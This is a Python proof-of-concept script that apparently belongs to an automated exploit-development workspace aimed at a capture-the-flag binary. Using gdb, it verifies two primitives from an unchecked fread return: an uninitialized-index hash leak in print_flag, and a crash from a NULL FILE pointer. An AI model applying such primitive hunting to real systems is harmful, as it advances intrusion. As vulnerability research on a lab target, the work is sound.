#!/usr/bin/env python3
"""
BUG-003: UNCHECKED_FREAD_RETURN_UNINITIALIZED_MEMORY_USE
Primitive Verification PoC

BUG: In print_flag(), fread(&random_byte, 1, 1, urandom_fp) return value
is not checked. If fread fails (returns 0), random_byte at [rbp-0x8]
remains uninitialized and is used as an index to select which loop2 hash
slot to leak.

PRIM-001: INFO_LEAK (uninitialized memory use as index)
  - When fread fails, uninitialized stack byte at [rbp-0x8] is used as
    hash array index (bounded 0-255 by movzx al)
  - The uninitialized byte contains residual stack content
  - The leaked hash value depends on the uninitialized index
  - Verification: close urandom fd via gdb, observe fread returns 0,
    random_byte stays uninitialized, program leaks hash at that index

PRIM-002: CRASH (corrupted FILE* causes SIGSEGV in fread)
  - If urandom FILE* at base+0x2070 is corrupted to NULL or invalid,
    fread dereferences it and crashes (SIGSEGV)
  - This is a dependent primitive: requires another BUG to corrupt FILE*
  - Verification: set FILE* to NULL/invalid via gdb, observe SIGSEGV
"""

import subprocess
import os
import re

TARGET = "/work/workspace/0006-2021-15-help-you-2-20260905-110906/target"
WORKSPACE = "/work/workspace/0006-2021-15-help-you-2-20260905-110906"

def run_gdb(gdb_script, stdin_data, timeout=30):
    """Run gdb with script and stdin, return output as text (latin-1 to handle binary)."""
    gdb_script_file = os.path.join(WORKSPACE, "gdb_tmp.txt")
    with open(gdb_script_file, 'w') as f:
        f.write(gdb_script)
    cmd = f"gdb -batch -x {gdb_script_file} {TARGET}"
    proc = subprocess.run(
        cmd, shell=True, input=stdin_data.encode('latin-1'),
        capture_output=True, timeout=timeout
    )
    output = (proc.stdout + proc.stderr).decode('latin-1', errors='replace')
    return output

# ============================================================
# PRIM-001: INFO_LEAK via uninitialized random_byte
# ============================================================
def prim001_verify():
    """
    Verify INFO_LEAK: uninitialized random_byte used as hash index.
    
    GDB script:
    1. Break at print_flag+0x61 (just before fread call)
    2. Close the urandom file descriptor (stored in FILE*._fileno)
    3. Record the uninitialized value at [rbp-0x8]
    4. Step over fread (returns 0, doesn't write)
    5. Record random_byte after movzx (the index used)
    6. Continue to see which hash is leaked
    """
    gdb_script = f"""
set cwd {WORKSPACE}
set pagination off
b *print_flag+0x61
run
set $urandom_fp = $rcx
set $fileno = *(int*)($urandom_fp + 0x70)
printf "URANDOM_FP=0x%lx FILENO=%d\\n", $urandom_fp, $fileno
call (int)close($fileno)
printf "BEFORE_RBP8=0x%02x,0x%02x,0x%02x,0x%02x\\n", *(unsigned char*)($rbp-0x8), *(unsigned char*)($rbp-0x7), *(unsigned char*)($rbp-0x6), *(unsigned char*)($rbp-0x5)
ni
printf "FREAD_RET=%ld\\n", $rax
printf "AFTER_RBP8=0x%02x,0x%02x,0x%02x,0x%02x\\n", *(unsigned char*)($rbp-0x8), *(unsigned char*)($rbp-0x7), *(unsigned char*)($rbp-0x6), *(unsigned char*)($rbp-0x5)
ni
ni
ni
printf "INDEX_USED=0x%02x DEC=%d\\n", *(unsigned char*)($rbp-0x8), *(unsigned char*)($rbp-0x8)
continue
quit
"""
    
    stdin_data = "AAAA\n"
    for i in range(256):
        stdin_data += f"guess{i}\n"
    
    output = run_gdb(gdb_script, stdin_data)
    print("=== PRIM-001 GDB Output ===")
    # Print only relevant lines
    for line in output.split('\n'):
        if any(tag in line for tag in ['URANDOM_FP', 'BEFORE_RBP8', 'FREAD_RET', 'AFTER_RBP8', 'INDEX_USED', 'hash values', 'SIGSEGV', 'Segmentation']):
            print(f"  {line.strip()}")
    
    # Parse evidence
    evidence = {}
    for line in output.split('\n'):
        if 'URANDOM_FP' in line:
            evidence['file_ptr'] = line.strip()
        if 'BEFORE_RBP8' in line:
            evidence['before'] = line.strip()
        if 'FREAD_RET' in line:
            evidence['fread_ret'] = line.strip()
        if 'AFTER_RBP8' in line:
            evidence['after'] = line.strip()
        if 'INDEX_USED' in line:
            evidence['index'] = line.strip()
        if 'hash values' in line:
            evidence['leaked_hash'] = line.strip()
    
    print("\n=== PRIM-001 Evidence Summary ===")
    for k, v in evidence.items():
        print(f"  {k}: {v}")
    
    # Verify: fread returned 0, random_byte unchanged (uninitialized)
    success = False
    if 'fread_ret' in evidence and 'FREAD_RET=0' in evidence['fread_ret']:
        if 'before' in evidence and 'after' in evidence:
            before_match = re.search(r'BEFORE_RBP8=0x(\w\w)', evidence['before'])
            after_match = re.search(r'AFTER_RBP8=0x(\w\w)', evidence['after'])
            if before_match and after_match:
                before_byte = before_match.group(1)
                after_byte = after_match.group(1)
                if before_byte.lower() == after_byte.lower():
                    success = True
                    print(f"\n=== PRIM-001: VERIFIED ===")
                    print(f"  fread returned 0 (failure - fd closed)")
                    print(f"  random_byte low byte unchanged: 0x{before_byte} (UNINITIALIZED)")
                    print(f"  Uninitialized byte used as hash array index")
                    if 'index' in evidence:
                        print(f"  Index used: {evidence['index']}")
                    if 'leaked_hash' in evidence:
                        print(f"  Leaked hash: {evidence['leaked_hash']}")
                else:
                    print(f"\n=== PRIM-001: PARTIAL ===")
                    print(f"  fread returned 0 but byte changed: 0x{before_byte} -> 0x{after_byte}")
    
    if not success:
        print(f"\n=== PRIM-001: CANDIDATE ===")
        print(f"  Static analysis confirms unchecked fread return")
    
    return success, evidence


# ============================================================
# PRIM-002: CRASH via corrupted FILE*
# ============================================================
def prim002_verify():
    """
    Verify CRASH: corrupted urandom FILE* causes SIGSEGV in fread.
    """
    gdb_script = f"""
set cwd {WORKSPACE}
set pagination off
b *print_flag+0x61
run
set $rcx = 0
printf "FILE_PTR_SET_NULL=1\\n"
ni
printf "CRASH_SIGNAL=%d\\n", $_siginfo.si_signo
quit
"""
    
    stdin_data = "AAAA\n"
    for i in range(256):
        stdin_data += f"guess{i}\n"
    
    output = run_gdb(gdb_script, stdin_data)
    print("\n=== PRIM-002 GDB Output ===")
    for line in output.split('\n'):
        if any(tag in line for tag in ['FILE_PTR', 'CRASH_SIGNAL', 'SIGSEGV', 'Segmentation', 'fault']):
            print(f"  {line.strip()}")
    
    has_crash = 'SIGSEGV' in output or 'Segmentation fault' in output
    if has_crash:
        print(f"\n=== PRIM-002: VERIFIED ===")
        print(f"  Corrupted FILE* (NULL) causes SIGSEGV in fread")
        print(f"  Crash at fread internal dereference of NULL FILE*")
    else:
        print(f"\n=== PRIM-002: CANDIDATE ===")
        print(f"  No crash observed")
    
    return has_crash


# ============================================================
# Main
# ============================================================
if __name__ == "__main__":
    print("BUG-003: UNCHECKED_FREAD_RETURN_UNINITIALIZED_MEMORY_USE")
    print("=" * 60)
    
    print("\n--- PRIM-001: INFO_LEAK (uninitialized index) ---")
    prim001_success, prim001_evidence = prim001_verify()
    
    print("\n--- PRIM-002: CRASH (corrupted FILE*) ---")
    prim002_success = prim002_verify()
    
    print("\n" + "=" * 60)
    print("Summary:")
    print(f"  PRIM-001 (INFO_LEAK): {'VERIFIED' if prim001_success else 'CANDIDATE'}")
    print(f"  PRIM-002 (CRASH):     {'VERIFIED' if prim002_success else 'CANDIDATE'}")
